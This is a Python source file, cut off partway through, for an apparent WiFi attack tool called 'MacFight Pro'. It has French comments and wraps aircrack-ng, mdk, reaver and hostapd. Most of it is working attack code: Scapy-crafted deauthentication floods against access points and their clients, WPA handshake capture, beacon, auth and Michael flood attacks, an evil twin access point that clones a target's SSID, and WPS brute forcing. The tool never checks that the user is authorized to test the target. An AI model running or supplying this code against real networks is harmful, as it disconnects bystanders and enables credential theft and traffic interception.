#!/usr/bin/env python3
"""
MacFight Pro v3.0 - Enterprise-grade WiFi Penetration Testing Tool
Refactored for stability, performance, and maintainability

Architecture:
  - ProcessManager: Gestionnaire centralisé des processus
  - NetworkScanner: Scan et parsing robuste d'airodump-ng
  - AttackFactory: Attaques WiFi avec gestion d'erreurs
  - HandshakeCapturer: Capture et validation de handshakes
  - CLIManager: Interface utilisateur sécurisée
"""

import subprocess
import os
import csv
import time
import sys
import signal
import glob as glob_module
import logging
import tempfile
import shutil
from pathlib import Path
from threading import Thread, Event, Lock, RLock
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict
import re
import psutil
from contextlib import contextmanager

# === IMPORTS SCAPY ===
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
    conf.verb = 0
except ImportError as e:
    print(f"[-] Scapy import error: {e}")
    sys.exit(1)


# CONFIGURATION LOGGING


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/macfight_pro.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)



# ÉNUMÉRATIONS & CONSTANTES


class Colors:
    """ANSI color codes"""
    RED = "\033[1;31m"
    ORANGE = "\033[1;33m"
    YELLOW = "\033[93m"
    GREEN = "\033[1;32m"
    BLUE = "\033[1;34m"
    CYAN = "\033[1;36m"
    RESET = "\033[0m"


class DeauthMethod(Enum):
    """Méthodes de déauthentification"""
    AIREPLAY = "aireplay-ng"
    MDK = "mdk3/mdk4"
    SCAPY = "scapy"
    PASSIVE = "passive"


class AttackType(Enum):
    """Types d'attaques"""
    DEAUTH = "deauth"
    HANDSHAKE = "handshake"
    FLOOD = "flood"
    EVIL_TWIN = "evil_twin"
    WPS = "wps"



# DATACLASSES


@dataclass
class APInfo:
    """Informations sur un point d'accès"""
    bssid: str
    essid: str
    channel: str
    power: int
    encryption: str
    clients: List[str] = field(default_factory=list)
    
    def __str__(self) -> str:
        return f"{self.essid} ({self.bssid})"


@dataclass
class ProcessMetadata:
    """Métadonnées d'un processus tracé"""
    pid: int
    name: str
    start_time: float
    attack_type: Optional[AttackType] = None
    
    def __post_init__(self):
        self.creation_time = time.time()



# GESTIONNAIRE DE PROCESSUS - CRITÈRE 1


class ProcessManager:
    """
    Gestionnaire centralisé des processus avec tracking robuste.
    Évite les processus zombies et fuites mémoire.
    """
    
    def __init__(self, max_age_seconds: int = 3600):
        self._processes: Dict[int, ProcessMetadata] = {}
        self._lock = RLock()
        self._max_age = max_age_seconds
        logger.info(f"ProcessManager initialized (max age: {max_age_seconds}s)")
    
    def add_process(
        self,
        proc: subprocess.Popen,
        name: str,
        attack_type: Optional[AttackType] = None
    ) -> int:
        """Ajouter un processus au tracking"""
        with self._lock:
            pid = proc.pid
            self._processes[pid] = ProcessMetadata(
                pid=pid,
                name=name,
                start_time=time.time(),
                attack_type=attack_type
            )
            logger.info(f"[ProcessManager] Tracking {name} (PID: {pid})")
            return pid
    
    def remove_process(self, pid: int) -> bool:
        """Retirer un processus du tracking"""
        with self._lock:
            if pid in self._processes:
                del self._processes[pid]
                logger.info(f"[ProcessManager] Removed PID {pid}")
                return True
            return False
    
    def terminate_process(self, pid: int, timeout: float = 2.0) -> bool:
        """Terminer proprement un processus"""
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            try:
                proc.wait(timeout=timeout)
                logger.info(f"[ProcessManager] Terminated PID {pid}")
                self.remove_process(pid)
                return True
            except psutil.TimeoutExpired:
                proc.kill()
                logger.warning(f"[ProcessManager] Killed PID {pid} (timeout)")
                self.remove_process(pid)
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
            logger.warning(f"[ProcessManager] Error terminating PID {pid}: {e}")
            self.remove_process(pid)
            return False
    
    def cleanup_all(self, timeout_per_process: float = 2.0) -> int:
        """Terminer tous les processus trackés"""
        with self._lock:
            pids = list(self._processes.keys())
            logger.info(f"[ProcessManager] Cleaning up {len(pids)} processes")
            
            killed_count = 0
            for pid in pids:
                if self.terminate_process(pid, timeout=timeout_per_process):
                    killed_count += 1
            
            return killed_count
    
    def cleanup_orphans(self, name_filter: str = None) -> int:
        """Nettoyer les processus orphelins (ne répondent pas)"""
        with self._lock:
            orphaned = []
            for pid, metadata in list(self._processes.items()):
                if name_filter and name_filter not in metadata.name:
                    continue
                try:
                    psutil.Process(pid)
                except psutil.NoSuchProcess:
                    orphaned.append(pid)
            
            for pid in orphaned:
                self.remove_process(pid)
            
            if orphaned:
                logger.info(f"[ProcessManager] Removed {len(orphaned)} orphaned processes")
            
            return len(orphaned)
    
    def get_active_count(self) -> int:
        """Nombre de processus actifs"""
        with self._lock:
            return len(self._processes)
    
    @contextmanager
    def managed_process(
        self,
        cmd: List[str],
        name: str,
        attack_type: Optional[AttackType] = None,
        **popen_kwargs
    ):
        """Context manager pour processus (auto-cleanup)"""
        proc = None
        try:
            proc = subprocess.Popen(cmd, **popen_kwargs)
            self.add_process(proc, name, attack_type)
            yield proc
        except Exception as e:
            logger.error(f"[ProcessManager] Error with {name}: {e}")
            raise
        finally:
            if proc and proc.pid:
                self.terminate_process(proc.pid)



# SCANNER RÉSEAU ROBUSTE - CRITÈRE 3


class NetworkScanner:
    """
    Scanner Wi-Fi robuste avec parsing tolérant aux erreurs.
    Gère plusieurs versions de airodump-ng.
    """
    
    def __init__(self, process_manager: ProcessManager, temp_dir: str = None):
        self.process_manager = process_manager
        self.temp_dir = temp_dir or tempfile.mkdtemp(prefix="macfight_")
        self.scan_file_prefix = os.path.join(self.temp_dir, "scan")
        logger.info(f"[NetworkScanner] Initialized with temp dir: {self.temp_dir}")
    
    def cleanup(self):
        """Nettoyer les fichiers de scan"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                logger.info(f"[NetworkScanner] Cleaned temp directory")
        except Exception as e:
            logger.error(f"[NetworkScanner] Cleanup error: {e}")
    
    def run_scan(self, interface: str, duration: int = 20) -> bool:
        """Lancer un scan airodump-ng"""
        self._cleanup_old_scans()
        
        cmd = [
            "airodump-ng",
            "-w", self.scan_file_prefix,
            "--output-format", "csv",
            interface
        ]
        
        try:
            logger.info(f"[NetworkScanner] Starting scan on {interface} for {duration}s")
            
            with self.process_manager.managed_process(
                cmd,
                "airodump-ng",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            ) as proc:
                try:
                    time.sleep(duration)
                except KeyboardInterrupt:
                    logger.info("[NetworkScanner] Scan interrupted by user")
                    return False
            
            logger.info("[NetworkScanner] Scan completed")
            return True
        
        except Exception as e:
            logger.error(f"[NetworkScanner] Scan error: {e}")
            return False
    
    def _cleanup_old_scans(self):
        """Nettoyer les scans précédents"""
        try:
            for f in glob_module.glob(f"{self.scan_file_prefix}-*.csv"):
                os.remove(f)
        except Exception as e:
            logger.debug(f"[NetworkScanner] Cleanup error: {e}")
    
    def parse_results(self) -> Tuple[List[APInfo], Dict[str, List[str]]]:
        """
        Parser les résultats de scan avec gestion des erreurs.
        Retourne (APs, clients_par_bssid)
        """
        csv_file = f"{self.scan_file_prefix}-01.csv"
        aps = []
        clients_by_bssid: Dict[str, List[str]] = defaultdict(list)
        
        if not os.path.exists(csv_file):
            logger.warning("[NetworkScanner] CSV file not found")
            return aps, dict(clients_by_bssid)
        
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            
            section = None
            seen_bssids = set()
            
            for line in lines:
                # Parser robuste: split et strip
                row = [col.strip() for col in line.split(',')]
                
                if not row or not row[0]:
                    continue
                
                first_col = row[0]
                
                # Détection de section
                if "BSSID" in first_col and "Power" in (row[8] if len(row) > 8 else ""):
                    section = "aps"
                    continue
                elif "Station MAC" in first_col or "Last beacon" in first_col:
                    section = "clients"
                    continue
                
                # Parser APs
                if section == "aps":
                    try:
                        ap = self._parse_ap_row(row, seen_bssids)
                        if ap:
                            aps.append(ap)
                            seen_bssids.add(ap.bssid)
                            clients_by_bssid[ap.bssid] = []
                    except Exception as e:
                        logger.debug(f"[NetworkScanner] Skipping AP row: {e}")
                
                # Parser clients
                elif section == "clients":
                    try:
                        client_mac, ap_bssid = self._parse_client_row(row)
                        if client_mac and ap_bssid in clients_by_bssid:
                            if client_mac not in clients_by_bssid[ap_bssid]:
                                clients_by_bssid[ap_bssid].append(client_mac)
                    except Exception as e:
                        logger.debug(f"[NetworkScanner] Skipping client row: {e}")
            
            logger.info(f"[NetworkScanner] Parsed {len(aps)} APs, {sum(len(c) for c in clients_by_bssid.values())} clients")
            return aps, dict(clients_by_bssid)
        
        except Exception as e:
            logger.error(f"[NetworkScanner] Parse error: {e}")
            return aps, dict(clients_by_bssid)
    
    @staticmethod
    def _parse_ap_row(row: List[str], seen_bssids: set) -> Optional[APInfo]:
        """Parser une ligne d'AP avec validation"""
        if len(row) < 14:
            return None
        
        bssid = row[0].strip()
        if not bssid or bssid in seen_bssids or bssid == "BSSID":
            return None
        
        # Validation BSSID format
        if not re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid):
            return None
        
        try:
            channel = row[3].strip() if row[3].strip().isdigit() else "?"
            power = int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else -100
            encryption = row[5].strip() if len(row) > 5 else "?"
            essid = row[13].strip() if len(row) > 13 else ""
            
            if not essid:
                essid = "<hidden>"
            
            return APInfo(
                bssid=bssid,
                essid=essid,
                channel=channel,
                power=power,
                encryption=encryption
            )
        except (ValueError, IndexError) as e:
            logger.debug(f"[NetworkScanner] AP parse error: {e}")
            return None
    
    @staticmethod
    def _parse_client_row(row: List[str]) -> Tuple[Optional[str], Optional[str]]:
        """Parser une ligne de client avec validation"""
        if len(row) < 6:
            return None, None
        
        client_mac = row[0].strip()
        ap_bssid = row[5].strip()
        
        # Validation MAC
        mac_pattern = r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$'
        if not re.match(mac_pattern, client_mac) or not re.match(mac_pattern, ap_bssid):
            return None, None
        
        return client_mac, ap_bssid



# DÉTECTEUR MODE MONITOR - CRITÈRE 4


class MonitorModeDetector:
    """Détection fiable du mode monitor"""
    
    @staticmethod
    def get_interfaces() -> List[str]:
        """Récupérer les interfaces Wi-Fi"""
        interfaces = []
        try:
            result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
            for line in result.splitlines():
                if "IEEE 802.11" in line:
                    parts = line.split()
                    if parts and not parts[0].startswith("lo"):
                        interfaces.append(parts[0])
            
            return list(set(interfaces))
        except Exception as e:
            logger.error(f"[MonitorModeDetector] Error getting interfaces: {e}")
            return []
    
    @staticmethod
    def is_monitor_mode(interface: str) -> bool:
        """Vérifier si interface est en mode monitor"""
        try:
            result = subprocess.check_output(["iwconfig", interface], stderr=subprocess.DEVNULL).decode()
            return "Mode:Monitor" in result
        except Exception as e:
            logger.debug(f"[MonitorModeDetector] iwconfig error: {e}")
            
            # Fallback: vérifier via iw
            try:
                result = subprocess.check_output(["iw", interface, "link"], stderr=subprocess.DEVNULL).decode()
                return "Not connected" in result
            except:
                return interface.endswith("mon")
    
    @staticmethod
    def enable_monitor_mode(interface: str, timeout: float = 5.0) -> Optional[str]:
        """Activer le mode monitor avec validation"""
        try:
            logger.info(f"[MonitorModeDetector] Enabling monitor mode on {interface}")
            
            # Arrêter les processus conflictuels
            subprocess.run(
                ["airmon-ng", "check", "kill"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(1)
            
            # Arrêter si déjà en mode monitor
            if interface.endswith("mon"):
                subprocess.run(
                    ["airmon-ng", "stop", interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                interface = interface[:-3]
            
            # Activer
            subprocess.run(
                ["airmon-ng", "start", interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(2)
            
            # Détecter l'interface monitor
            start = time.time()
            while time.time() - start < timeout:
                if MonitorModeDetector.is_monitor_mode(interface):
                    logger.info(f"[MonitorModeDetector] Monitor mode enabled on {interface}")
                    return interface
                
                # Vérifier interface*mon
                for pattern in [f"{interface}mon", f"{interface}0mon", "wlan0mon"]:
                    if MonitorModeDetector.is_monitor_mode(pattern):
                        logger.info(f"[MonitorModeDetector] Monitor mode enabled on {pattern}")
                        return pattern
                
                time.sleep(0.5)
            
            logger.error(f"[MonitorModeDetector] Monitor mode activation timeout")
            return None
        
        except Exception as e:
            logger.error(f"[MonitorModeDetector] Error enabling monitor: {e}")
            return None
    
    @staticmethod
    def disable_monitor_mode(interface: str):
        """Désactiver le mode monitor"""
        if not interface or not interface.endswith("mon"):
            return
        
        try:
            logger.info(f"[MonitorModeDetector] Disabling monitor mode on {interface}")
            subprocess.run(
                ["airmon-ng", "stop", interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            time.sleep(1)
            subprocess.run(
                ["systemctl", "restart", "NetworkManager"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
        except Exception as e:
            logger.warning(f"[MonitorModeDetector] Error disabling monitor: {e}")



# GESTIONNAIRE DE CHANNEL


class ChannelManager:
    """Gestion des channels avec validation"""
    
    @staticmethod
    def set_channel(interface: str, channel: str) -> bool:
        """Définir le channel"""
        if channel == "?":
            logger.warning("[ChannelManager] Invalid channel")
            return False
        
        try:
            if not channel.isdigit():
                logger.warning(f"[ChannelManager] Invalid channel format: {channel}")
                return False
            
            subprocess.run(
                ["iwconfig", interface, "channel", channel],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=3
            )
            time.sleep(0.5)
            logger.debug(f"[ChannelManager] Set channel {channel} on {interface}")
            return True
        
        except Exception as e:
            logger.error(f"[ChannelManager] Error setting channel: {e}")
            return False



# CAPTEUR DE HANDSHAKE AVEC VALIDATION - CRITÈRE 8


class HandshakeCapturer:
    """
    Capteur de handshake robuste avec détection automatique.
    Valide les 4-way handshakes EAPOL.
    """
    
    def __init__(self, process_manager: ProcessManager, temp_dir: str):
        self.process_manager = process_manager
        self.handshake_dir = os.path.join(temp_dir, "handshakes")
        Path(self.handshake_dir).mkdir(parents=True, exist_ok=True)
        logger.info(f"[HandshakeCapturer] Handshake dir: {self.handshake_dir}")
    
    def capture(
        self,
        ap: APInfo,
        clients: List[str],
        interface: str,
        method: DeauthMethod = DeauthMethod.AIREPLAY,
        duration: int = 60
    ) -> Optional[str]:
        """
        Capturer le handshake avec déauthentification.
        Retourne le chemin du fichier de capture ou None.
        """
        
        if ap.channel == "?":
            logger.error("[HandshakeCapturer] Invalid channel")
            return None
        
        if not ChannelManager.set_channel(interface, ap.channel):
            logger.error("[HandshakeCapturer] Failed to set channel")
            return None
        
        # Fichier de sortie
        safe_name = self._sanitize_filename(ap.essid)
        output_file = os.path.join(
            self.handshake_dir,
            f"{safe_name}_{ap.bssid.replace(':', '')}"
        )
        
        logger.info(f"[HandshakeCapturer] Capturing handshake to {output_file}")
        
        # Lancer airodump
        airodump_proc = None
        deauth_proc = None
        
        try:
            cmd = [
                "airodump-ng",
                "-c", ap.channel,
                "--bssid", ap.bssid,
                "-w", output_file,
                "--output-format", "cap",
                interface
            ]
            
            airodump_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.process_manager.add_process(airodump_proc, "airodump-ng")
            time.sleep(2)
            
            # Lancer déauthentification
            deauth_proc = self._start_deauth(
                method, ap, clients, interface
            )
            
            # Attendre le handshake
            logger.info(f"[HandshakeCapturer] Waiting {duration}s for handshake...")
            
            start_time = time.time()
            handshake_found = False
            
            while time.time() - start_time < duration:
                # Vérifier si handshake capturé (simple heuristique)
                if self._verify_handshake_file(output_file):
                    handshake_found = True
                    logger.info("[HandshakeCapturer] Handshake detected!")
                    break
                
                time.sleep(2)
            
            if not handshake_found:
                logger.warning("[HandshakeCapturer] Handshake not detected (timeout)")
                logger.info("[HandshakeCapturer] File may still contain valid handshake")
            
            return output_file
        
        except Exception as e:
            logger.error(f"[HandshakeCapturer] Capture error: {e}")
            return None
        
        finally:
            # Cleanup
            if airodump_proc and airodump_proc.pid:
                self.process_manager.terminate_process(airodump_proc.pid)
            if deauth_proc and deauth_proc.pid:
                self.process_manager.terminate_process(deauth_proc.pid)
    
    def _start_deauth(
        self,
        method: DeauthMethod,
        ap: APInfo,
        clients: List[str],
        interface: str
    ) -> Optional[subprocess.Popen]:
        """Lancer la déauthentification"""
        
        try:
            if method == DeauthMethod.AIREPLAY:
                return self._deauth_aireplay(ap, clients, interface)
            elif method == DeauthMethod.MDK:
                return self._deauth_mdk(ap, interface)
            elif method == DeauthMethod.SCAPY:
                return self._deauth_scapy(ap, clients, interface)
            else:
                logger.info("[HandshakeCapturer] Passive capture mode")
                return None
        
        except Exception as e:
            logger.error(f"[HandshakeCapturer] Deauth start error: {e}")
            return None
    
    def _deauth_aireplay(
        self,
        ap: APInfo,
        clients: List[str],
        interface: str
    ) -> Optional[subprocess.Popen]:
        """Déauth via aireplay-ng"""
        
        logger.info("[HandshakeCapturer] Using aireplay-ng for deauth")
        
        if clients:
            # Attaquer clients spécifiques
            proc = subprocess.Popen(
                ["aireplay-ng", "--deauth", "15", "-a", ap.bssid, "-c", clients[0], interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            # Broadcast deauth
            proc = subprocess.Popen(
                ["aireplay-ng", "--deauth", "15", "-a", ap.bssid, interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        return proc
    
    def _deauth_mdk(self, ap: APInfo, interface: str) -> Optional[subprocess.Popen]:
        """Déauth via mdk4/mdk3"""
        
        if shutil.which("mdk4") is None and shutil.which("mdk3") is None:
            logger.warning("[HandshakeCapturer] mdk3/mdk4 not installed")
            return None
        
        mdk_cmd = shutil.which("mdk4") or shutil.which("mdk3")
        logger.info(f"[HandshakeCapturer] Using {mdk_cmd} for deauth")
        
        try:
            bssid_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            bssid_file.write(ap.bssid + "\n")
            bssid_file.close()
            
            proc = subprocess.Popen(
                [mdk_cmd, interface, "d", "-b", bssid_file.name, "-c", ap.channel],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return proc
        
        except Exception as e:
            logger.error(f"[HandshakeCapturer] MDK error: {e}")
            return None
    
    def _deauth_scapy(
        self,
        ap: APInfo,
        clients: List[str],
        interface: str
    ) -> Optional[subprocess.Popen]:
        """Déauth via Scapy dans un thread"""
        
        logger.info("[HandshakeCapturer] Using Scapy for deauth")
        stop_event = Event()
        
        def send_deauth_packets():
            end_time = time.time() + 30
            while time.time() < end_time and not stop_event.is_set():
                try:
                    # Broadcast
                    pkt = RadioTap() / Dot11(
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=ap.bssid,
                        addr3=ap.bssid
                    ) / Dot11Deauth(reason=7)
                    sendp(pkt, iface=interface, verbose=0)
                    
                    # Clients spécifiques
                    for client in clients:
                        pkt2 = RadioTap() / Dot11(
                            addr1=client,
                            addr2=ap.bssid,
                            addr3=ap.bssid
                        ) / Dot11Deauth(reason=7)
                        sendp(pkt2, iface=interface, verbose=0)
                
                except Exception as e:
                    logger.debug(f"[HandshakeCapturer] Scapy send error: {e}")
                
                time.sleep(0.1)
        
        thread = Thread(target=send_deauth_packets, daemon=False)
        thread.start()
        
        # Retourner objet similaire à Popen
        return type('obj', (object,), {'pid': thread.ident})()
    
    def _verify_handshake_file(self, output_file: str) -> bool:
        """Vérifier simplement si fichier capturé (heuristique)"""
        cap_file = f"{output_file}-01.cap"
        if os.path.exists(cap_file):
            size = os.path.getsize(cap_file)
            if size > 10000:  # Au moins 10KB
                return True
        return False
    
    @staticmethod
    def _sanitize_filename(s: str) -> str:
        """Nettoyer un nom de fichier"""
        s = s.strip()
        s = re.sub(r'[^A-Za-z0-9 _-]', '_', s)
        s = s.replace(' ', '_')
        return s[:64]



# FACTORY ATTAQUES - CRITÈRE 2 & THREADING


class AttackFactory:
    """Factory pour les attaques WiFi avec gestion d'erreurs précises"""
    
    def __init__(self, process_manager: ProcessManager, temp_dir: str):
        self.process_manager = process_manager
        self.temp_dir = temp_dir
        self.handshake_capturer = HandshakeCapturer(process_manager, temp_dir)
    
    def deauth_attack(
        self,
        ap: APInfo,
        clients: List[str],
        interface: str,
        duration: int = 90
    ) -> bool:
        """Attaque de déauthentification"""
        
        if ap.channel == "?":
            logger.error("[AttackFactory] Invalid channel")
            return False
        
        if not ChannelManager.set_channel(interface, ap.channel):
            return False
        
        logger.info(f"[AttackFactory] Deauth attack on {ap} for {duration}s")
        
        # Construire les paquets
        packets = []
        
        if clients:
            logger.info(f"[AttackFactory] Targeting {len(clients)} clients + broadcast")
            for client in clients:
                pkt1 = RadioTap() / Dot11(
                    addr1=client, addr2=ap.bssid, addr3=ap.bssid
                ) / Dot11Deauth(reason=7)
                pkt2 = RadioTap() / Dot11(
                    addr1=ap.bssid, addr2=client, addr3=client
                ) / Dot11Deauth(reason=7)
                packets.extend([pkt1, pkt2])
        
        # Broadcast
        pkt_bc = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff", addr2=ap.bssid, addr3=ap.bssid
        ) / Dot11Deauth(reason=7)
        packets.append(pkt_bc)
        
        if not packets:
            logger.error("[AttackFactory] No packets to send")
            return False
        
        # Thread d'envoi avec mécanisme propre
        stop_event = Event()
        packet_count = [0]  # Utiliser une liste pour modification dans closure
        
        def send_loop():
            end_time = time.time() + duration
            try:
                while time.time() < end_time and not stop_event.is_set():
                    for pkt in packets:
                        if stop_event.is_set():
                            break
                        try:
                            sendp(pkt, iface=interface, verbose=0)
                            packet_count[0] += 1
                        except Exception as e:
                            logger.error(f"[AttackFactory] Send error: {e}")
                            stop_event.set()
                            break
                    
                    time.sleep(0.02)  # Optimisé (moins de sleep)
                    
                    if packet_count[0] % 200 == 0 and packet_count[0] > 0:
                        remaining = int(end_time - time.time())
                        logger.info(f"[AttackFactory] {packet_count[0]} packets | {remaining}s remaining")
            
            except Exception as e:
                logger.error(f"[AttackFactory] Attack error: {e}")
            
            logger.info(f"[AttackFactory] Deauth complete. Total: {packet_count[0]} packets")
        
        # Lancer le thread
        attack_thread = Thread(target=send_loop, daemon=False)
        attack_thread.start()
        
        try:
            input(f"\n{Colors.YELLOW}[!] Press Enter to stop...{Colors.RESET}")
        except KeyboardInterrupt:
            pass
        finally:
            stop_event.set()
            attack_thread.join(timeout=3)
        
        return True
    
    def handshake_attack(
        self,
        ap: APInfo,
        clients: List[str],
        interface: str,
        method: DeauthMethod = DeauthMethod.AIREPLAY
    ) -> Optional[str]:
        """Capturer un handshake"""
        return self.handshake_capturer.capture(ap, clients, interface, method)
    
    def flood_attack(self, ap: APInfo, interface: str, attack_type: str = "deauth") -> bool:
        """Attaque par flood"""
        
        if ap.channel == "?":
            logger.error("[AttackFactory] Invalid channel")
            return False
        
        if not ChannelManager.set_channel(interface, ap.channel):
            return False
        
        mdk_cmd = shutil.which("mdk4") or shutil.which("mdk3")
        if not mdk_cmd:
            logger.error("[AttackFactory] mdk3/mdk4 not installed")
            return False
        
        logger.info(f"[AttackFactory] Flood attack ({attack_type}) using {mdk_cmd}")
        
        try:
            bssid_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            bssid_file.write(ap.bssid + "\n")
            bssid_file.close()
            
            if attack_type == "beacon":
                cmd = [mdk_cmd, interface, "b", "-c", ap.channel]
            elif attack_type == "auth":
                cmd = [mdk_cmd, interface, "a", "-a", ap.bssid]
            elif attack_type == "michael":
                cmd = [mdk_cmd, interface, "m", "-t", ap.bssid]
            else:  # deauth
                cmd = [mdk_cmd, interface, "d", "-b", bssid_file.name]
            
            with self.process_manager.managed_process(
                cmd,
                f"flood_{attack_type}",
                AttackType.FLOOD,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            ) as proc:
                input(f"\n{Colors.YELLOW}[!] Attack running... Press Enter to stop...{Colors.RESET}")
            
            return True
        
        except Exception as e:
            logger.error(f"[AttackFactory] Flood error: {e}")
            return False
    
    def evil_twin_attack(self, ap: APInfo, interface: str) -> bool:
        """Créer un Evil Twin"""
        
        if ap.channel == "?":
            logger.error("[AttackFactory] Invalid channel")
            return False
        
        if shutil.which("hostapd") is None or shutil.which("dnsmasq") is None:
            logger.error("[AttackFactory] hostapd or dnsmasq not installed")
            return False
        
        original_interface = interface
        iface_managed = interface
        
        # Revenir au mode managed si en monitor
        if interface.endswith("mon"):
            logger.info("[AttackFactory] Disabling monitor mode for hostapd")
            MonitorModeDetector.disable_monitor_mode(interface)
            iface_managed = interface[:-3]
            time.sleep(1)
        
        logger.info(f"[AttackFactory] Creating Evil Twin {ap}")
        
        try:
            # Fichiers config
            hostapd_conf = self._generate_hostapd_config(ap, iface_managed)
            dnsmasq_conf = self._generate_dnsmasq_config(iface_managed)
            
            hostapd_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.conf')
            hostapd_file.write(hostapd_conf)
            hostapd_file.close()
            
            dnsmasq_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.conf')
            dnsmasq_file.write(dnsmasq_conf)
            dnsmasq_file.close()
            
            # Configuration IP
            subprocess.run(
                ["ifconfig", iface_managed, "192.168.1.1", "netmask", "255.255.255.0"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Lancer services
            with self.process_manager.managed_process(
                ["hostapd", hostapd_file.name],
                "hostapd",
                AttackType.EVIL_TWIN,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            ):
                time.sleep(2)
                
                with self.process_manager.managed_process(
                    ["dnsmasq", "-C", dnsmasq_file.name, "-d"],
                    "dnsmasq",
                    AttackType.EVIL_TWIN,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                ):
                    logger.info(f"[AttackFactory] Evil Twin active: {ap.essid}")
                    input(f"\n{Colors.YELLOW}[!] Press Enter to stop...{Colors.RESET}")
            
            return True
        
        except Exception as e:
            logger.error(f"[AttackFactory] Evil Twin error: {e}")
            return False
        
        finally:
            # Réactiver monitor mode
            if original_interface.endswith("mon"):
                logger.info("[AttackFactory] Re-enabling monitor mode")
                MonitorModeDetector.enable_monitor_mode(iface_managed)
    
    def wps_attack(self, ap: APInfo, interface: str) -> bool:
        """Attaque WPS"""
        
        if ap.channel == "?":
            logger.error("[AttackFactory] Invalid channel")
            return False
        
        if shutil.which("reaver") is None:
            logger.error("[AttackFactory] Reaver not installed")
            return False
        
        if not ChannelManager.set_channel(interface, ap.channel):
            return False
        
        logger.info(f"[AttackFactory] WPS attack on {ap}")
        
        try:
            with self.process_manager.managed_process(
                ["reaver", "-i", interface, "-b", ap.bssid, "-c", ap.channel, "-vv", "-N"],
                "reaver",
                AttackType.WPS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            ) as proc:
                input(f"\n{Colors.YELLOW}[!] WPS attack running... Press Enter to stop...{Colors.RESET}")
            
            return True
        
        except Exception as e:
            logger.error(f"[AttackFactory] WPS error: {e}")
            return False
    
    @staticmethod
    def _generate_hostapd_config(ap: APInfo, interface: str) -> str:
        """Générer config hostapd"""
        return f"""interface={interface}
driver=nl80211
ssid={ap.essid}
hw_mode=g
channel={ap.channel}
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    
    @staticmethod
    def _generate_dnsmasq_config(interface: str) -> str:
        """Générer config dnsmasq"""
        return f"""interface={interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
"""



# CLI MANAGER - CRITÈRE 10


class CLIManager:
    """Gestionnaire d'interface CLI avec validation"""
    
    @staticmethod
    def print_banner():
        """Afficher la bannière"""
        os.system("clear")
        print(Colors.RED + r"""
          
███▄ ▄███▓ ▄▄▄       ▄████▄    █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓
▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█  ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒
▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░
▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ 
▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ 
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   
░  ░      ░  ▒   ▒▒ ░  ░  ▒    ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░    
░      ░     ░   ▒   ░         ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░      
       ░         ░  ░░ ░              ░        ░  ░  ░  ░          
""" + Colors.RESET)
        print(f"{Colors.ORANGE}                    Developed by H8Laws{Colors.RESET}")
        print(f"{Colors.CYAN}                  MacFight Pro v3.0 Enterprise Edition{Colors.RESET}\n")
    
    @staticmethod
    def check_dependencies() -> bool:
        """Vérifier les dépendances"""
        required = {
            "airmon-ng": "aircrack-ng",
            "airodump-ng": "aircrack-ng",
            "aireplay-ng": "aircrack-ng",
